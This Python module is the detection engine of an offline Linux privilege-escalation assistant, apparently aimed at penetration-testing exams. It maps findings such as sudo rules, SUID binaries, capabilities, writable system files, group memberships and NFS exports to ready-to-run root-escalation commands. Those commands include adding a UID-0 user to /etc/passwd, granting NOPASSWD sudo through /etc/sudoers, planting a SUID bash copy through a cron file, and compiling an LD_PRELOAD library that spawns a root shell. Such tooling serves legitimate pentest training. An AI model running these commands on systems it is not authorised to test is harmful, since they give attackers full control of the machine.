"""
The deterministic reasoning engine.

Turns Findings into ranked :class:`Vector` objects — concrete privilege-escalation
opportunities with the exact command(s) to try. Requires no API key; this is what
makes Sentinel useful offline and on an exam clock.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from . import knowledge as kb
from .findings import Finding, by_category

# Confidence scores (higher = try first).
HIGH, MEDIUM, LOW = 90, 60, 30


@dataclass
class Vector:
    name: str                       # short label, e.g. "SUID find -> GTFOBins"
    technique: str                  # taxonomy tag, e.g. "suid", "sudo", "group"
    confidence: int                 # 0-100
    evidence: list[str]             # the findings that triggered it
    commands: list[str]             # exact commands to escalate
    explanation: str                # why this works
    reference: str = ""             # a docs link
    source: str = "rule"            # "rule" or "llm"

    def sort_key(self):
        return (-self.confidence, self.name)


# Binaries that are normally SUID and are *not* by themselves exploitable — don't
# flag them as findings-of-interest to avoid noise.
_BORING_SUID = {
    "sudo", "su", "passwd", "chsh", "chfn", "newgrp", "gpasswd", "mount",
    "umount", "ping", "ping6", "pkexec", "fusermount", "fusermount3",
    "ntfs-3g", "dbus-daemon-launch-helper", "polkit-agent-helper-1",
}


def _sudo_binaries(rule: str) -> list[str]:
    """Extract candidate binary basenames from a `sudo -l` rule line."""
    bins = []
    for token in re.findall(r"/[\w./-]+", rule):
        bins.append(kb.basename(token))
    return bins


def _lookup(binary: str, table: dict) -> str | None:
    """Resolve a binary name to a KB key, tolerating version suffixes
    (python3.8 -> python3 -> python)."""
    if binary in table:
        return binary
    trimmed = re.sub(r"[.\d]+$", "", binary)   # python3.8 -> python, gcc-9 -> gcc-
    trimmed = trimmed.rstrip("-.")
    if trimmed and trimmed in table:
        return trimmed
    return None


def detect(findings: list[Finding]) -> list[Vector]:
    vectors: list[Vector] = []

    # --- sudo -----------------------------------------------------------
    for f in by_category(findings, "sudo"):
        rule = f.value
        if f.key == "all" or "(ALL : ALL) ALL" in rule or "(ALL) ALL" in rule.upper():
            vectors.append(Vector(
                name="Full sudo access",
                technique="sudo", confidence=HIGH, evidence=[f.raw or rule],
                commands=["sudo /bin/bash", "sudo -i"],
                explanation="The user may run any command via sudo — instant root.",
                reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation",
            ))
            continue
        for b in _sudo_binaries(rule):
            key = _lookup(b, kb.SUDO_PAYLOADS)
            if key:
                conf = HIGH if f.detail == "NOPASSWD" else MEDIUM
                vectors.append(Vector(
                    name=f"sudo {b} -> shell (GTFOBins)",
                    technique="sudo", confidence=conf, evidence=[f.raw or rule],
                    commands=[kb.SUDO_PAYLOADS[key].format(bin=b)],
                    explanation=f"'{b}' is runnable via sudo and can spawn a shell, "
                                f"inheriting root. {'No password required.' if f.detail=='NOPASSWD' else ''}",
                    reference=f"https://gtfobins.github.io/gtfobins/{b}/",
                ))

    # --- SUID binaries --------------------------------------------------
    for f in by_category(findings, "suid"):
        b = kb.basename(f.value)
        key = _lookup(b, kb.SUID_PAYLOADS)
        if key:
            vectors.append(Vector(
                name=f"SUID {b} -> shell (GTFOBins)",
                technique="suid", confidence=HIGH, evidence=[f.value],
                commands=[kb.SUID_PAYLOADS[key].format(bin=f.value)],
                explanation=f"'{f.value}' is SUID-root and '{b}' can execute commands, "
                            f"so it runs the payload as root.",
                reference=f"https://gtfobins.github.io/gtfobins/{b}/",
            ))
        elif b not in _BORING_SUID:
            vectors.append(Vector(
                name=f"Unusual SUID binary: {b}",
                technique="suid", confidence=LOW, evidence=[f.value],
                commands=[f"# investigate {f.value} — custom/uncommon SUID binary",
                          f"strings {f.value} | less", f"ltrace {f.value}"],
                explanation="A non-standard SUID-root binary. Custom SUID binaries "
                            "often call helpers via relative path or leak into a shell.",
            ))

    # --- capabilities ---------------------------------------------------
    for f in by_category(findings, "cap"):
        b = kb.basename(f.value)
        key = _lookup(b, kb.CAP_SETUID_PAYLOADS)
        if "cap_setuid" in f.detail.lower() and key:
            vectors.append(Vector(
                name=f"cap_setuid on {b} -> root",
                technique="capability", confidence=HIGH, evidence=[f.detail or f.value],
                commands=[kb.CAP_SETUID_PAYLOADS[key].format(bin=f.value)],
                explanation=f"'{f.value}' holds cap_setuid, so it can setuid(0) and drop "
                            f"into a root shell without being SUID.",
                reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities",
            ))

    # --- writable sensitive files --------------------------------------
    for f in by_category(findings, "writable"):
        if f.key == "etc_passwd":
            vectors.append(Vector(
                name="Writable /etc/passwd",
                technique="writable", confidence=HIGH, evidence=[f.value],
                commands=[
                    "openssl passwd -1 -salt x pass123   # generate a hash",
                    "echo 'r00t:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd",
                    "su r00t   # password: pass123",
                ],
                explanation="/etc/passwd is writable — add a UID-0 user with a known "
                            "password and su to it.",
                reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd",
            ))
        elif f.key == "etc_shadow":
            vectors.append(Vector(
                name="Writable/readable /etc/shadow",
                technique="writable", confidence=MEDIUM, evidence=[f.value],
                commands=["cat /etc/shadow", "# crack root's hash: hashcat -m 1800 hash rockyou.txt"],
                explanation="/etc/shadow is accessible — crack root's hash offline, or "
                            "overwrite it with a known hash.",
            ))
        elif f.key == "sudoers":
            vectors.append(Vector(
                name="Writable /etc/sudoers",
                technique="writable", confidence=HIGH, evidence=[f.value],
                commands=["echo '<user> ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "sudo -i"],
                explanation="/etc/sudoers is writable — grant yourself full sudo.",
            ))
        elif f.key == "cron":
            vectors.append(Vector(
                name=f"Writable cron path: {f.value}",
                technique="cron", confidence=MEDIUM, evidence=[f.value],
                commands=[f"echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> {f.value}",
                          "# wait for the root cron to run, then: /tmp/rootbash -p"],
                explanation="A cron file we can write runs as root on schedule — plant a "
                            "SUID-bash payload.",
            ))

    # --- group memberships ---------------------------------------------
    for f in by_category(findings, "group"):
        info = kb.GROUP_EXPLOITS.get(f.value)
        if info:
            vectors.append(Vector(
                name=f"Member of '{f.value}' group",
                technique="group",
                confidence=HIGH if f.value in ("docker", "lxd", "lxc") else MEDIUM,
                evidence=[f"groups: {f.raw}"],
                commands=[info["cmd"]],
                explanation=info["why"], reference=info["ref"],
            ))

    # --- NFS no_root_squash --------------------------------------------
    for f in by_category(findings, "nfs"):
        share = f.value.split()[0] if f.value else "<share>"
        vectors.append(Vector(
            name="NFS no_root_squash export",
            technique="nfs", confidence=MEDIUM, evidence=[f.value],
            commands=[
                f"# on your attacker box (as root): mount -t nfs TARGET:{share} /mnt",
                "cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash",
                "# back on target: /path/rootbash -p",
            ],
            explanation="An NFS export with no_root_squash lets a remote root create a "
                        "SUID-root binary inside the share.",
            reference="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting",
        ))

    # --- sudo LD_PRELOAD -----------------------------------------------
    for f in by_category(findings, "env"):
        vectors.append(Vector(
            name="sudo env_keep += LD_PRELOAD",
            technique="env", confidence=MEDIUM, evidence=[f.value],
            commands=[
                "cat > /tmp/x.c <<'EOF'\n#include <stdlib.h>\nvoid _init(){setgid(0);setuid(0);system(\"/bin/sh\");}\nEOF",
                "gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c",
                "sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>",
            ],
            explanation="sudo preserves LD_PRELOAD — load a malicious library that spawns "
                        "a root shell when any sudo command runs.",
            reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload",
        ))

    # --- kernel hints (advisory) ---------------------------------------
    for f in by_category(findings, "os"):
        if f.key != "kernel":
            continue
        for hint in kb.KERNEL_HINTS:
            try:
                if hint["match"](f.value):
                    vectors.append(Vector(
                        name=f"Possible kernel exploit: {hint['name']} ({hint['cve']})",
                        technique="kernel", confidence=LOW, evidence=[f"kernel {f.value}"],
                        commands=[f"# verify exact kernel/distro, then search: {hint['cve']}"],
                        explanation=hint["note"], reference=hint["ref"],
                    ))
            except Exception:  # noqa: BLE001
                continue

    vectors.sort(key=lambda v: v.sort_key())
    return vectors
